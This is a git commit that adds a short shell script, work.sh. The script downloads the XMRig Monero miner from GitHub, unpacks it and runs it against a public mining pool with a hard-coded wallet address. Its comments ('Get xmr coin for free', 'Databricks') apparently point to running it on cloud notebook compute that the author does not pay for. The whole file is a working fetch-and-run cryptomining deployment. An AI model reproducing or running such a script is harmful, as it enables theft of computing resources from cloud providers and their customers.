ee16a69142e3da17d82d17e3ec4e6f3836a8758d
Lanawoods21 <103140836+Lanawoods21@users.noreply.github.com>
2022-04-07 00:49:45 +0530

    Create work.sh

---
+++ work.sh
@@ -0,0 +1,10 @@
+#! /bin/bash
+# Get xmr coin for free
+# Databricks
+sudo apt update
+
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
+tar xvzf xmrig-6.16.4-focal-x64.tar.gz
+cd xmrig-6.16.4
+./xmrig -o us-west.minexmr.com:443 -u 48tDH9mg5oDM6J6nLYyQYEBmy1ZCbPbLiF8rgWyssEVZ1CBcj9XqU4nSTsS3tpBTRq5WK28wEJqJ5SGmVFv2SvaN9X2ZDti -k --tls --rig-id Main
